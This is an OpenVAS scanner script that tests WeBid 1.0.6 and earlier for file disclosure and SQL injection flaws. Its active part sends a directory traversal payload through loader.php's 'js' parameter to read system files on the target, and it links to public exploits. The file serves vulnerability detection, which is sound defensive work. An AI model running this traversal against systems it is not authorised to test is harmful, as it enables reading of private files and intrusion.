###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_webid_file_disc_n_sql_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# WeBid Local File Disclosure and SQL Injection Vulnerabilities
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to perform file disclosure
  attacks and read arbitrary files on the affected application or perform SQL
  injection and compromise the application.
  Impact Level: Application";

tag_affected = "WeBid version 1.0.6 and prior";
tag_insight = "The flaws are due to improper input validation
  - Input passed via the 'js' parameter to loader.php, allows attackers to
    read arbitrary files.
  - $_POST['startnow'] is directly used in mysql query without sanitization
    in yourauctions_p.php.";
tag_solution = "No solution or patch is available as on 09th May, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.webidsupport.com";
tag_summary = "This host is running WeBid and is prone to file disclosure and SQL
  Injection vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803399";
CPE = "cpe:/a:webidsupport:webid";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-05-09 17:11:32 +0530 (Thu, 09 May 2013)");
  script_name("WeBid Local File Disclosure and SQL Injection Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://1337day.com/exploit/20730");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/25249");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/webid-106-file-disclosure-sql-injection");
  script_summary("Check for File Disclosure vulnerability in WeBid");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_webid_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("webid/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  port = 80;
}

## Check port status
if(!get_port_state(port))exit(0);

## Get Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();

foreach file (keys(files))
{
  ## Construct directory traversal attack
  url = dir + "/loader.php?js=" + files[file];

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:port, url:url, pattern:file))
  {
    security_hole(port);
    exit(0);
  }
}
